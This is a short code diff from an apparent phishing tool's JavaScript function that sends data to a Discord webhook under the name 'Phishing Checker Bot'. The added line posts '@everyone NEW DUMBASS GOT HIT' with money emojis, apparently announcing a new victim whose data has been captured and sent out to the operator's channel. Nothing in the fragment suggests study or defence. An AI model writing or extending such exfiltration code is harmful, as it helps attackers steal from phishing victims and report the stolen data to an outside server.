@@ -162,6 +162,7 @@ async function sendToWebhook(data) {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
+                content: '@everyone NEW DUMBASS GOT HIT 🤑💰💰',
                 username: 'Phishing Checker Bot',
                 avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
                 embeds: [embed]
